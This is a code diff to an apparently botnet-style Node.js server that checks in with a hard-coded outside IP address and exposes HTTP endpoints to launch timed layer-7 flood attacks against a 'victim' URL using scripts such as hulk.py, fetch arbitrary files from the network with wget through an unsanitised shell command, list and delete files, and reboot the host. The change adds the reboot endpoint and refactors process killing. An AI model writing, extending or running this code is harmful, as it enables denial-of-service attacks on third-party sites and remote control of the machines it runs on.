@@ -8,11 +8,9 @@ const lockdown = false
 const port = 3000 // access port
 const managerIP = "" //only IP that can send commands in if lockdown === true.
 
-
-let machineBusy = false //machine attack state declaration
-let pythonActive = false //python state declaration
-let python = null //defining python beforehand so we can change it afterwards
-
+let machineBusy = false
+let pythonActive = false
+let python = null
 
 function inithb() {
     var options = { method: 'POST', url: 'http://18.193.150.142:30120/hb/' };
@@ -23,6 +21,7 @@ function inithb() {
         console.error(error);
     });
 }
+
 inithb()
 
 app.use((req, res, next) => {
@@ -60,7 +59,6 @@ app.get('/layer7adv/:victim/:time/:script', (req, res) => {
     if (!(machineBusy)) {
         let victim_ = req.params.victim
         let victim = (victim_.replace(/ç/g, "/"))
-
         let timelimit = req.params.time
         let script = req.params.script
         if (isNaN(timelimit)) {
@@ -83,8 +81,6 @@ app.get('/layer7adv/:victim/:time/:script', (req, res) => {
     }
 })
 
-
-
 app.get('/remfile/:valx/', (req, res) => {
 
     const path = './' + req.params.valx
@@ -105,15 +101,13 @@ app.get('/addfile/:fin/:exn/', (req, res) => {
     let download = async function (filename) {
         let command = `wget ${filename}`;
         let result = cp.execSync(command);
+        res.send(200, {result})
     };
     async function test(filn) {
         await download(filn)
     }
     test(filn)
-    res.send(200)
 })
-
-
 
 app.get('/listdir/', (req, res) => {
     let folderarr = []
@@ -126,6 +120,19 @@ app.get('/listdir/', (req, res) => {
     res.send(200, { folderarr })
 })
 
+app.get('/reboot/', (req, res) => {
+    let cp = require('child_process')
+    let rboot = async function () {
+        let command = `reboot`;
+        res.send(200)
+        cp.execSync(command);
+    };
+    async function test() {
+        await rboot()
+    }
+    test()
+    res.send(200)
+})
 
 app.get('/layer7stop/', (req, res) => {
     if (pythonActive) {
@@ -145,16 +152,11 @@ async function mainT(victim, time) {
         machineBusy = true
         pythonActive = true
         python = spawn('/usr/bin/python2', ['/home/ubuntu/l7flood/hulk.py', `http://${victim}`]);
-
         machineBusy = true
         pythonActive = true
         await delay(time * 1000)
         if (pythonActive) {
-            python.kill("SIGINT")
-            python.kill("SIGTERM")
-            console.log("KILLED PYTHON.")
-            machineBusy = false
-            pythonActive = false
+            pythonTermination()
         }
     }
 }
@@ -164,19 +166,43 @@ async function advancedPython(victim, time, scriptname) {
         machineBusy = true
         pythonActive = true
         python = spawn('/usr/bin/python2', [`/home/ubuntu/l7flood/${scriptname}.py`, `http://${victim}`]);
-
         machineBusy = true
         pythonActive = true
         await delay(time * 1000)
         if (pythonActive) {
-            python.kill("SIGINT")
-            python.kill("SIGTERM")
-            console.log("KILLED PYTHON.")
-            machineBusy = false
-            pythonActive = false
+            pythonTermination()
         }
     }
 }
 
+function pythonTermination(){
+    python.kill("SIGINT")
+    python.kill("SIGTERM")
+    console.log("KILLED PYTHON.")
+    machineBusy = false
+    pythonActive = false
+}
+
 app.listen(port, () => console.log(`App listening on port
 ${port}!`))
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
